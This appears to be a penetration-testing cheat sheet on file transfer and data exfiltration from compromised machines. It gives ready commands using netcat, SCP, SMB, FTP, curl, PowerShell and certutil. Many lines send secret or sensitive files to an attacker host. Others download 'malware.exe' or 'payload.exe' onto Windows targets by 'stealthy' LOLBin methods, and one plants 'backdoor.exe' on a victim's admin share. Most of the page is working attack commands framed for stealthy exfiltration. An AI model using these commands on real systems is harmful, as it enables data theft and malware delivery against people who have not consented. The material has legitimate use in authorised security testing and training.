| Method | When to use |
|---|---|
| `python3 -m http.server` | Fastest for pulling files to attacker from Linux target |
| `impacket-smbserver share .` | Windows targets — mount as a drive letter |
| `curl -T file http://attacker/upload` | Pushing files to attacker-controlled server |
| `nc -w3 attacker 4444 < file` | Simple, no dependencies |
| Certutil (Windows) | `certutil -urlcache -split -f http://attacker/file out` |
| DNS exfil | When only port 53 outbound is allowed |

!!! tip "Tip"
    For Windows file transfers, `certutil` and `bitsadmin` are LOLBins — no dropped binaries. `certutil -urlcache -split -f <url> <output>` works on most Windows versions.

### Using Netcat for File Transfers

Netcat (`nc`) is a simple and efficient way to transfer files between systems.

#### Linux to Linux

Sender:

```bash
nc -lvnp 4444 < secret.txt
```

Receiver:

```bash
nc attacker_ip 4444 > retrieved.txt
```

##### Windows to Linux

Sender (Windows PowerShell):

```powershell
Get-Content C:\Users\Public\secret.txt | nc -w 3 attacker_ip 4444
```

Receiver (Linux):

```bash
nc -lvnp 4444 > retrieved.txt
```

### Using SCP for Secure Transfers

SCP (Secure Copy Protocol) uses SSH for secure file transfers.

#### Linux to Linux

```bash
scp secret.txt user@remote_ip:/tmp/
```

#### Windows to Linux using WinSCP

WinSCP provides a graphical interface for SCP transfers.

PowerShell equivalent:

```powershell
scp C:\Users\Public\secret.txt user@attacker_ip:/home/user/
```

### Using SMB for Windows File Transfers

If SMB is enabled, it can be used to transfer files between Windows systems.

#### Mapping a Network Drive

```powershell
net use \\attacker_ip\shared_folder /user:attacker secretpassword
copy C:\sensitive_data.txt \\attacker_ip\shared_folder\
```

#### Using SMBClient on Linux

```bash
smbclient -U user //victim_ip/C$ -c 'put backdoor.exe'
```

### Using FTP for Transfers

If an FTP server is available, it can be used to transfer files.

### Uploading via FTP (Interactive)

```bash
ftp victim_ip
# Enter credentials
put secret.txt
```

#### Automating FTP with PowerShell

```powershell
$WebClient = New-Object System.Net.WebClient
$WebClient.UploadFile("ftp://attacker_ip/secret.txt", "C:\sensitive.txt")
```

### Using HTTP(S) for File Transfers

#### Downloading a File with cURL

```bash
curl http://attacker_ip/malware.exe -o C:\Users\Public\malware.exe
```

#### Python Simple HTTP Server for Quick Transfers

```bash
python3 -m http.server 8000
```

On the target:

```bash
wget http://attacker_ip:8000/secret.txt -O /tmp/secret.txt
```

### Using PowerShell for File Transfers

#### Download a File from a Remote Server

```powershell
Invoke-WebRequest -Uri "http://attacker_ip/malware.exe" -OutFile "C:\Users\Public\malware.exe"
```

#### Using Certutil for Stealthy Downloads

```powershell
certutil -urlcache -f http://attacker_ip/payload.exe C:\Windows\Temp\payload.exe
```

These techniques provide different levels of security and stealth, making them useful in various scenarios for file transfer and data exfiltration.